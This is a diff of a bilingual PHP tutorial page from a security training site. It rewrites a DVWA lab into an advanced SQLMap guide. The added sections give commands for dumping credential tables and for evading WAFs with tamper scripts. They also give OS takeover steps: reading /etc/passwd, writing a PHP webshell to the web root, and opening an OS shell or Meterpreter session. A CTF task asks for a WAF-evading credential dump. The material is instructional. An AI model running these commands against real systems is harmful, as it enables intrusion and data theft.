@@ -1,121 +1,161 @@
 <?php
 /**
  * CyberEscudo — Proyecto: SQLMAP
- * Contenido: Práctica 2.2 — Sergio Belmonte Morales
  */
 require_once __DIR__ . '/../bootstrap.php';
 
 $pageTitle    = $lang === 'es' ? 'SQLMap — Explotación de SQL Injection — CyberEscudo' : 'SQLMap — SQL Injection Exploitation — CyberEscudo';
-$contentTitle = $lang === 'es' ? 'SQLMap: Explotación de SQL Injection' : 'SQLMap: SQL Injection Exploitation';
+$contentTitle = $lang === 'es' ? 'SQLMap: Explotación Avanzada de SQL Injection' : 'SQLMap: Advanced SQL Injection Exploitation';
 $contentDate  = '2022-02-08';
-$contentTags  = ['SQLMap', 'SQL Injection', 'DVWA', 'BurpSuite', 'Pentesting'];
+$contentDiff  = 'advanced';
+$contentTags  = ['SQLMap', 'SQL Injection', 'DVWA', 'BurpSuite', 'WAF Bypass', 'OS-Shell'];
 
 ob_start();
 if ($lang === 'es'): ?>
 <div class="prose">
-  <p>Práctica sobre el uso de <strong>SQLMap</strong> para detectar y explotar vulnerabilidades de inyección SQL en la plataforma <strong>DVWA</strong> (Damn Vulnerable Web Application) en modo <em>low security</em>.</p>
+  <p><strong>SQLMap</strong> es la herramienta de código abierto más potente y completa para la detección y explotación automatizada de vulnerabilidades de inyección SQL (SQLi). Soporta 6 tipos diferentes de inyección: <em>Boolean-based blind, Time-based blind, Error-based, UNION query-based, Stacked queries</em> y <em>Out-of-band</em>.</p>
 
-  <h2>1. Obtención de Cookies con BurpSuite</h2>
-  <p>Para autenticarnos en DVWA, SQLMap necesita la cookie de sesión. La obtenemos con <strong>BurpSuite</strong>:</p>
-  <ol>
-    <li>Abre BurpSuite y ve a <code>Proxy → Intercept</code>.</li>
-    <li>Pulsa <strong>"Intercept is on"</strong> para empezar a capturar peticiones.</li>
-    <li>Navega a la página vulnerable de DVWA en el navegador configurado con el proxy de Burp.</li>
-    <li>Copia el valor completo de la cabecera <code>Cookie:</code> de la petición interceptada.</li>
-  </ol>
+  <h2>1. El Método Profesional: Archivos de Petición (<code>-r</code>)</h2>
+  <p>Aunque puedes pasar la URL (<code>-u</code>) y las cookies (<code>--cookie</code>) manualmente, es tedioso y propenso a errores. El estándar en auditorías es interceptar la petición con BurpSuite, guardarla en un archivo <code>.txt</code> y pasársela a SQLMap. Esto inyecta todos los encabezados, cookies y datos POST automáticamente.</p>
+  <pre><code># 1. En BurpSuite, intercepta la petición vulnerable.
+# 2. Clic derecho -> "Copy to file" (guárdalo como request.txt).
+# 3. Lanza SQLMap indicando el archivo:
+sqlmap -r request.txt --dbs</code></pre>
 
-  <p>La cookie tendrá un aspecto similar a:</p>
-  <pre><code>security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada</code></pre>
+  <h2>2. Extracción de Información (Enumeración)</h2>
+  <p>Una vez confirmada la inyección, el objetivo es mapear la estructura de la base de datos para encontrar la información valiosa.</p>
+  <pre><code># Enumerar todas las bases de datos disponibles:
+sqlmap -r request.txt --dbs
 
-  <h2>2. Extracción Completa de Información (<code>-a</code>)</h2>
-  <p>El flag <code>-a</code> intenta extraer toda la información posible del servidor de base de datos: esquemas, tablas, columnas, usuarios, contraseñas, hostname y más.</p>
-  <pre><code>sudo sqlmap \
-  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
-  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" \
-  -a</code></pre>
+# Obtener usuario actual, base de datos actual y privilegios:
+sqlmap -r request.txt --current-user --current-db --is-dba
 
-  <h2>3. Usuario Actual y Base de Datos Actual</h2>
-  <p>Obtener el usuario MySQL con el que se ejecutan las consultas y el nombre de la base de datos en uso:</p>
-  <pre><code>sudo sqlmap \
-  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
-  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" \
-  --current-db --current-user</code></pre>
+# Enumerar las tablas de una base de datos específica (-D):
+sqlmap -r request.txt -D dvwa --tables
 
-  <h2>4. Enumerar Columnas de una Tabla</h2>
-  <p>Extraer las columnas de la tabla <code>users</code> dentro del esquema <code>dvwa</code>:</p>
-  <pre><code>sudo sqlmap \
-  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
-  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" \
-  -D dvwa -T users --columns</code></pre>
+# Enumerar las columnas de una tabla específica (-T):
+sqlmap -r request.txt -D dvwa -T users --columns
 
-  <h2>5. Extraer Usuarios y Contraseñas</h2>
-  <p>Volcar el contenido de las columnas <code>user</code> y <code>password</code> de la tabla <code>users</code>:</p>
-  <pre><code>sudo sqlmap \
-  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
-  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" \
-  -D dvwa -T users -C user,password --dump</code></pre>
+# Volcar (Dump) todo el contenido de la tabla:
+sqlmap -r request.txt -D dvwa -T users --dump
 
-  <p>Las contraseñas están hasheadas en <strong>MD5</strong>. SQLMap incluye la opción de intentar crackearlas con su diccionario integrado. Cuando aparezca el prompt, pulsa <code>y</code> para iniciarlo:</p>
-  <pre><code>[INFO] recognized possible password hashes in column 'password'
-do you want to crack them via a dictionary-based attack? [Y/n/q] y</code></pre>
+# Volcar solo columnas específicas (-C):
+sqlmap -r request.txt -D dvwa -T users -C user,password --dump</code></pre>
 
-  <h2>6. SQL Shell Interactiva</h2>
-  <p>SQLMap permite abrir una shell SQL interactiva para ejecutar consultas directas contra la base de datos desde la línea de comandos:</p>
-  <pre><code>sudo sqlmap \
-  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
-  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada" \
-  -D dvwa --sql-shell</code></pre>
+  <h2>3. Evasión de WAF/IPS y Sigilo</h2>
+  <p>Los firewalls de aplicaciones web (WAF) como Cloudflare o ModSecurity bloquearán los payloads por defecto de SQLMap. Necesitamos afinar el escáner para ser indetectables.</p>
+  <pre><code># Añadir retraso entre peticiones (en segundos) para no disparar alertas de Rate Limiting:
+sqlmap -r request.txt --delay=2
 
-  <p>Una vez dentro de la shell puedes ejecutar sentencias SQL directamente:</p>
-  <pre><code>sql-shell> SELECT user, password FROM users;
-sql-shell> SHOW DATABASES;
-sql-shell> SELECT @@version;</code></pre>
+# Usar un User-Agent de un navegador real (por defecto SQLMap usa el suyo propio y es bloqueado):
+sqlmap -r request.txt --random-agent
 
-  <h2>Resumen de Flags Utilizados</h2>
-  <table>
-    <thead>
-      <tr><th>Flag</th><th>Descripción</th></tr>
-    </thead>
-    <tbody>
-      <tr><td><code>-u</code></td><td>URL objetivo con el parámetro vulnerable</td></tr>
-      <tr><td><code>--cookie</code></td><td>Cookies de sesión para autenticación</td></tr>
-      <tr><td><code>-a</code></td><td>Extraer toda la información posible</td></tr>
-      <tr><td><code>--current-db</code></td><td>Obtener la base de datos actual</td></tr>
-      <tr><td><code>--current-user</code></td><td>Obtener el usuario MySQL actual</td></tr>
-      <tr><td><code>-D</code></td><td>Especificar base de datos objetivo</td></tr>
-      <tr><td><code>-T</code></td><td>Especificar tabla objetivo</td></tr>
-      <tr><td><code>-C</code></td><td>Especificar columnas a extraer</td></tr>
-      <tr><td><code>--columns</code></td><td>Enumerar columnas de la tabla</td></tr>
-      <tr><td><code>--dump</code></td><td>Volcar el contenido de la tabla</td></tr>
-      <tr><td><code>--sql-shell</code></td><td>Abrir una shell SQL interactiva</td></tr>
-    </tbody>
-  </table>
+# Forzar el uso de scripts Tamper para ofuscar los payloads.
+# space2comment.py cambia los espacios en blanco por comentarios (/**/) para evadir filtros simples:
+sqlmap -r request.txt --tamper=space2comment
+
+# Aumentar la agresividad del escaneo (Level 1-5, Risk 1-3).
+# Level 3+ inyecta en cabeceras HTTP (User-Agent, Referer). Risk 3 usa sentencias pesadas como OR/AND.
+sqlmap -r request.txt --level=3 --risk=2</code></pre>
+
+  <!-- ─── SECCIÓN DEL RETO CTF 22 (ESPAÑOL) ─── -->
+  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
+      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
+          <span style="animation: pulse 2s infinite;">🔴</span> Simulador WAF Bypass
+      </h3>
+      <p style="margin-bottom: 1.5rem;">Has interceptado una petición hacia un panel de administrador y la has guardado como <code>request.txt</code>. Hay un WAF configurado que bloquea inyecciones con espacios en blanco. Construye el comando de <strong>sqlmap</strong> que utilice el archivo de petición, vuelque (dump) la tabla <code>admin_creds</code> de la base de datos <code>corp_db</code>, y utilice el script tamper <code>space2comment</code> para evadir el firewall.</p>
+      <a href="/ctf/ctf-22.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
+          &gt;_ INICIAR RETO CTF 22
+      </a>
+  </div>
+
+  <h2>4. Toma de Control del Servidor (OS Takeover)</h2>
+  <p>Si el usuario de la base de datos es <code>root</code> o <code>DBA</code> (Database Administrator) y el servidor tiene una misconfiguración de lectura/escritura de archivos (como <code>FILE</code> priv en MySQL o <code>xp_cmdshell</code> en MSSQL), SQLMap puede saltar de la base de datos al sistema operativo subyacente.</p>
+  <pre><code># Leer un archivo del servidor víctima:
+sqlmap -r request.txt --file-read="/etc/passwd"
+
+# Subir un archivo al servidor (Ej: Una webshell PHP):
+sqlmap -r request.txt --file-write="webshell.php" --file-dest="/var/www/html/webshell.php"
+
+# ¡El Santo Grial! Abrir una consola interactiva en el servidor (RCE):
+sqlmap -r request.txt --os-shell
+
+# Lanzar Meterpreter a través de la inyección SQL (Para conectar con Metasploit):
+sqlmap -r request.txt --os-pwn</code></pre>
+
+  <h2>5. Shell SQL Interactiva</h2>
+  <p>Si no puedes conseguir una shell del sistema operativo, al menos puedes conseguir una consola SQL interactiva directa para teclear comandos nativos (útil cuando SQLMap falla al extraer un volcado limpio).</p>
+  <pre><code>sqlmap -r request.txt --sql-shell
+# sql-shell> SELECT @@version;
+# sql-shell> SHOW GRANTS;</code></pre>
+
 </div>
 
 <?php else: ?>
 <div class="prose">
-  <p>Practice on using <strong>SQLMap</strong> to detect and exploit SQL injection vulnerabilities on <strong>DVWA</strong> in low security mode.</p>
+  <p><strong>SQLMap</strong> is the most powerful and comprehensive open-source tool for automated detection and exploitation of SQL injection (SQLi) vulnerabilities. It supports 6 types of injections: <em>Boolean-based blind, Time-based blind, Error-based, UNION query-based, Stacked queries</em>, and <em>Out-of-band</em>.</p>
 
-  <h2>1. Get Cookies with BurpSuite</h2>
-  <p>Open BurpSuite → Proxy → Intercept. Enable interception and navigate to DVWA to capture the session cookie.</p>
+  <h2>1. The Professional Way: Request Files (<code>-r</code>)</h2>
+  <p>While you can pass URLs (<code>-u</code>) and cookies (<code>--cookie</code>) manually, the industry standard is to intercept the request with BurpSuite, save it to a <code>.txt</code> file, and pass it to SQLMap. This automatically parses all headers, cookies, and POST data.</p>
+  <pre><code># 1. In BurpSuite, intercept the vulnerable request.
+# 2. Right-click -> "Copy to file" (save as request.txt).
+# 3. Launch SQLMap using the file:
+sqlmap -r request.txt --dbs</code></pre>
 
-  <h2>2. Dump All Information</h2>
-  <pre><code>sudo sqlmap \
-  -u "http://10.0.2.4/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit#" \
-  --cookie "security=low; PHPSESSID=9ben154elh1p2k3258ugb89r16" \
-  -a</code></pre>
+  <h2>2. Data Extraction (Enumeration)</h2>
+  <p>Once the injection is confirmed, map the database structure to find valuable data.</p>
+  <pre><code># Enumerate all databases:
+sqlmap -r request.txt --dbs
 
-  <h2>3. Current Database and User</h2>
-  <pre><code>sudo sqlmap [url] [cookie] --current-db --current-user</code></pre>
+# Get current user, current DB, and check for DBA privileges:
+sqlmap -r request.txt --current-user --current-db --is-dba
 
-  <h2>4. Enumerate Columns</h2>
-  <pre><code>sudo sqlmap [url] [cookie] -D dvwa -T users --columns</code></pre>
+# Enumerate tables in a specific database (-D):
+sqlmap -r request.txt -D dvwa --tables
 
-  <h2>5. Dump Users and Passwords</h2>
-  <pre><code>sudo sqlmap [url] [cookie] -D dvwa -T users -C user,password --dump</code></pre>
+# Enumerate columns in a specific table (-T):
+sqlmap -r request.txt -D dvwa -T users --columns
 
-  <h2>6. Interactive SQL Shell</h2>
-  <pre><code>sudo sqlmap [url] [cookie] -D dvwa --sql-shell</code></pre>
+# Dump the entire table:
+sqlmap -r request.txt -D dvwa -T users --dump
+
+# Dump specific columns only (-C):
+sqlmap -r request.txt -D dvwa -T users -C user,password --dump</code></pre>
+
+  <!-- ─── SECCIÓN DEL RETO CTF 22 (INGLÉS) ─── -->
+  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
+      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
+          <span style="animation: pulse 2s infinite;">🔴</span> WAF Bypass Simulator
+      </h3>
+      <p style="margin-bottom: 1.5rem;">You intercepted a request to an admin panel and saved it as <code>request.txt</code>. A WAF is configured to block injections containing whitespace. Build the <strong>sqlmap</strong> command to use the request file, dump the <code>admin_creds</code> table from the <code>corp_db</code> database, and use the <code>space2comment</code> tamper script to evade the firewall.</p>
+      <a href="/ctf/ctf-22.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
+          &gt;_ START CTF 22 CHALLENGE
+      </a>
+  </div>
+
+  <h2>3. WAF/IPS Evasion & Stealth</h2>
+  <p>Web Application Firewalls (WAF) like Cloudflare will block default SQLMap payloads. We must tune the scanner to remain undetected.</p>
+  <pre><code># Add a delay between requests (in seconds) to avoid Rate Limiting:
+sqlmap -r request.txt --delay=2
+
+# Use a random, real browser User-Agent:
+sqlmap -r request.txt --random-agent
+
+# Use Tamper scripts to obfuscate payloads.
+# space2comment.py replaces whitespaces with comments (/**/) to evade simple filters:
+sqlmap -r request.txt --tamper=space2comment
+
+# Increase scan aggressiveness (Level 1-5, Risk 1-3).
+# Level 3+ injects into HTTP headers (User-Agent, Referer).
+sqlmap -r request.txt --level=3 --risk=2</code></pre>
+
+  <h2>4. OS Takeover</h2>
+  <p>If the DB user is <code>root</code> or <code>DBA</code>, and the server has file read/write misconfigurations (like <code>FILE</code> priv in MySQL or <code>xp_cmdshell</code> in MSSQL), SQLMap can jump from the database to the underlying Operating System.</p>
+  <pre><code># Read a file from the victim server:
+sqlmap -r request.txt --file-read="/etc/passwd"
+
+# The Holy Grail! Pop an interactive OS shell (RCE):
+sqlmap -r request.txt --os-shell</code></pre>
 </div>
 <?php endif;
 $contentBody = ob_get_clean();
